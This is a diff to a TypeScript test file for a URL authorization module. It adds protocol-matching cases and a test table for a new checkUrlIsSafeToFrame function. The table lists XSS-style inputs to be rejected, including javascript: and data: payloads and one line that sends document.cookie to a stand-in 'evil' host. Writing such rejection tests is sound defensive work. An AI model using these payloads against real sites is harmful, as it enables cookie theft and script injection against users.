@@ -15,6 +15,7 @@ import {
     appEditorUrl,
     authorizedUrlListLogic,
     checkUrlIsAuthorized,
+    checkUrlIsSafeToFrame,
     directToolbarUrl,
     filterNotAuthorizedUrls,
     validateProposedUrl,
@@ -128,6 +129,9 @@ describe('the authorized urls list logic', () => {
             // www-equivalence both directions
             { url: 'https://example.com', authorized: ['https://www.example.com'], expected: true },
             { url: 'https://www.example.com', authorized: ['https://example.com'], expected: true },
+            // Protocol must match: an http origin must not match an https-only authorized entry
+            { url: 'http://example.com', authorized: ['https://example.com'], expected: false },
+            { url: 'http://www.example.com', authorized: ['https://example.com'], expected: false },
             // wildcard subdomains and ports
             { url: 'https://app.example.com', authorized: ['https://*.example.com'], expected: true },
             { url: 'https://a.b.example.com', authorized: ['https://*.example.com'], expected: true },
@@ -355,6 +359,40 @@ describe('the authorized urls list logic', () => {
         it('includes toolbarFlagsKey when provided', () => {
             const params = parseHash(directToolbarUrl('https://example.com', { toolbarFlagsKey: 'flags_key_xyz' }))
             expect(params.toolbarFlagsKey).toBe('flags_key_xyz')
+        })
+    })
+
+    describe('checkUrlIsSafeToFrame', () => {
+        const authorizedUrls = ['https://example.com', 'https://*.allowed.com', 'http://localhost:*']
+
+        const testCases: { url: string; safe: boolean }[] = [
+            // Authorized http(s) URLs are safe to frame
+            { url: 'https://example.com', safe: true },
+            { url: 'https://example.com/some/path', safe: true },
+            { url: 'https://app.allowed.com', safe: true },
+            { url: 'http://localhost:3000', safe: true },
+            // Authorized host but a dangerous scheme must still be rejected
+            { url: 'javascript:alert(document.domain)', safe: false },
+            { url: 'javascript:fetch("//evil?"+document.cookie)//', safe: false },
+            { url: 'data:text/html,<script>alert(1)</script>', safe: false },
+            { url: 'blob:https://example.com/uuid', safe: false },
+            { url: 'vbscript:msgbox(1)', safe: false },
+            { url: 'JavaScript:alert(1)', safe: false },
+            { url: ' javascript:alert(1)', safe: false },
+            // Valid scheme but origin is not authorized
+            { url: 'https://evil.example.net', safe: false },
+            { url: 'https://example.org', safe: false },
+            // Degenerate inputs fail closed
+            { url: '', safe: false },
+            { url: 'not-a-url', safe: false },
+        ]
+
+        it.each(testCases)('treats "$url" as safe=$safe to frame', ({ url, safe }) => {
+            expect(checkUrlIsSafeToFrame(url, authorizedUrls)).toBe(safe)
+        })
+
+        it('is unsafe when no URLs are authorized', () => {
+            expect(checkUrlIsSafeToFrame('https://example.com', [])).toBe(false)
         })
     })
 
